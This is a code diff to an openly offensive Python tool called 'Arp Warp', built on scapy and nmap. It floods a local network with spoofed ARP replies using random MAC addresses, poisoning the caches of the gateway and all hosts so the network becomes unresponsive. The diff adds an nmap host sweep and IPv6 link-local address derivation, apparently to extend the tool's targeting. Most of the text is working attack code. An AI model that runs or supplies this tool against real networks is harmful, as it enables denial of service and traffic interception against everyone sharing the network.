@@ -1,14 +1,21 @@
 import argparse
 import logging
 import ipaddress
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
+import nmap
+from typing import List
 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
+# TODO must ifconfig
+# TODO nmap elegantly
+# TODO gateway auto
+# TODO test on ipv6 at home
+# TODO stats at first and then del lines output
 from scapy.all import *
 conf.verb = 0
 
 #   --------------------------------------------------------------------------------------------------------------------
 #
-#   Arp Warp attack - Continously poison the ARP cache of all hosts on the connected network to make it unresponsive
+#   Arp Warp attack - Continuously poison the ARP cache of all hosts on the connected network to make it unresponsive
 #
 #   Notes
 #       * 
@@ -32,35 +39,64 @@ class ArpWarp:
     _P_TIMEOUT = 2
     _P_RETRY = 10
 
+    _IPV6_LL_PREF = "fe80"
+    _IPV6_LL_PREFLEN = 64
+
     def __init__(self, iface, cidr, s_time, gateway):
         print(f"[*] Setting up attacker...")
 
         self.network_interface = iface
         conf.iface = self.network_interface
-        self.cidr = cidr
+        self.cidr_ipv4 = cidr
         self.arp_poison_interval = s_time
 
         self.my_private_ip = get_if_addr(self.network_interface)
-        self.subnet = self.my_private_ip.split(".")[:3]
+        self.my_mac = get_if_hwaddr(self.network_interface)
+        self.my_private_ipv6 = self.mac2ipv6(self.my_mac)
 
-        self.gateway_ip = gateway or f"{'.'.join(self.subnet)}.1"
+        self.subnet_ipv4 = self.my_private_ip.split(".")[:3]
+        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidr_ipv4}"
+
+        self.gateway_ip = gateway or f"{'.'.join(self.subnet_ipv4)}.1"  # TODO not this way
         self.gateway_mac = getmacbyip(self.gateway_ip)
+        self.gateway_ipv6 = self.mac2ipv6(self.gateway_mac)
 
         if not self.gateway_mac:
             raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")
 
-        self.host_ips = [str(host_ip) for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
-                         str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ip]
-        print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")
+        self.host_ipv6s = self.get_all_hosts_ipv6()
+        print(f"[*] Generated {len(self.host_ipv6s)} existing IPV6 host targets")
+        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
+                           str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ip]
+        print(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 host targets for subnet {'.'.join(self.subnet_ipv4)}.x")
 
         self.abort = False
+        self.get_all_hosts_ipv6()
+
+    def get_all_hosts_ipv6(self) -> List[str]:
+        print("[*] Running NMAP for IPv6 -> MAC mapping, this may take a minute...")
+        ipv6_list = list()
+        nm = nmap.PortScanner()
+        nm.scan(hosts=self.subnet_ipv4_sr, arguments="-sP -n")
+        for host in nm.all_hosts():
+            if host != self.my_private_ip and host != self.gateway_ip:
+                try:
+                    addr = self.mac2ipv6(nm[host]['addresses']['mac'])
+                    ipv6_list.append(addr)
+                    print(nm[host]['addresses']['mac'])
+                    print(f"[+] Discovered IPV4 {host} -> IPV6 {addr}")
+                except KeyError:
+                    print(f"[!] Error getting MAC address for host {host}, try running with sudo")
+                    exit(-1)
+        print(nm.all_hosts())
+        return ipv6_list
 
     def poison_arp(self):
         """
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
-        for host_ip in self.host_ips:
+        for host_ip in self.host_ipv4s:
             # poison gateways's arp cache
             arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
             sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
@@ -83,6 +119,11 @@ class ArpWarp:
             except KeyboardInterrupt:
                 print(f"[*] User requested to stop...")
                 self.abort = True
+
+    @staticmethod
+    def mac2ipv6(mac):
+        m = hex(int(mac.translate(str.maketrans('', '', ' .:-')), 16) ^ 0x020000000000)[2:]
+        return 'fe80::%s:%sff:fe%s:%s' % (m[:4], m[4:6], m[6:8], m[8:12])
 
 
 if __name__ == "__main__":
